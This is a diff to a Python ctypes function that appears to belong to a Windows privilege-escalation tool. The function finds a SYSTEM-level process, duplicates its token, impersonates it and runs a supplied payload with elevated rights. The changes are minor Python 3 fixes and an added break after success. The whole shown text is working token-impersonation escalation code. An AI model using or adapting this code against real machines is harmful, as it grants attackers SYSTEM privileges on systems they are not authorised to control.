@@ -43,14 +43,14 @@ def elevate_token_impersonation(payload):
 		EnumProcesses(ProcessIds, ProcessIdsSize, ProcessesReturned)
 		foundSystemprocess = False
 
-		RunningProcesses = ProcessesReturned.value / sizeof(DWORD)
+		RunningProcesses = int(ProcessesReturned.value / sizeof(DWORD))
 		for process in range(RunningProcesses):
 			ProcessId = ProcessIds[process]
 			currenthandle = OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
 			if currenthandle:
 				ProcessName = (c_char * 260)()
 				if GetProcessImageFileName(currenthandle, ProcessName, 260):
-					ProcessName = ProcessName.value.split("\\")[-1]
+					ProcessName = ProcessName.value.split(b"\\")[-1]
 					if not foundSystemprocess:
 						processToken = HANDLE(c_void_p(-1).value)
 						OpenProcessToken(currenthandle, TOKEN_PRIVS, byref(processToken))
@@ -64,7 +64,7 @@ def elevate_token_impersonation(payload):
 							print_info("Found system IL process ({}) with PID: {}".format(ProcessName,ProcessId))
 							print_info("Grabbing token")
 							foundSystemprocess = True
-								
+
 						hTokendupe = HANDLE(c_void_p(-1).value)
 						DuplicateTokenEx(processToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, byref(hTokendupe))                
 						ImpersonateLoggedOnUser(hTokendupe)
@@ -77,7 +77,8 @@ def elevate_token_impersonation(payload):
 						if CreateProcessWithToken(hTokendupe, 0x00000002, payload, None, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
 							print_error("Error while triggering admin payload using CreateProcessWithLogonW: {}".format(GetLastError()))
 						else:
-							print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))							
+							print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))
+							break
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
